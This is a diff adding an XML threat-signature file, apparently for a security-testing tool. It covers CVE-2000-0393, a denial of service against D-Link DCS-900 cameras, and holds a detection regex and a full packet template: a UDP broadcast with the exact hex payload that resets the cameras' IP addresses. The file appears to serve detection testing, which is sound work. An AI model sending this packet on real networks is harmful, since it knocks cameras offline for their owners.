@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="D-Link Internet Camera Denial of Service"/>
+    <EngDesc display="true" value="This threat sends out a UDP packet that resets the IP address of all local D-Link cameras."/>
+    <Intent display="true">
+      <item value="Implementation_Exploitation"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="UDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Network_Appliance"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="D-Link"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="D-Link_DCS-900_Internet_Camera"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.securiteam.com/exploits/5JP050A1QK.html"/>
+    <CVEID display="true" value="CVE-2000-0393"/>
+    <bugtraqID display="true" value="1206"/>
+    <OSVDB display="true" value="1334"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464d6f1100a900fe009b00c9740b4dee"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725881489062500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\XFD\XFD\X00\X04\X00\X03\X00\X0F\X3D\X56\X97\X07\X0A\X00\X32\X32\X00\X00\XFF\XFF\XFF\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00\X00"/>
+    <Created value="1139461966" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="30" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="255.255.255.255" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="62976" destPort="$destPort" checksum="" length="" Payload="FDFD00040003000F3D5697070A0032320000FFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
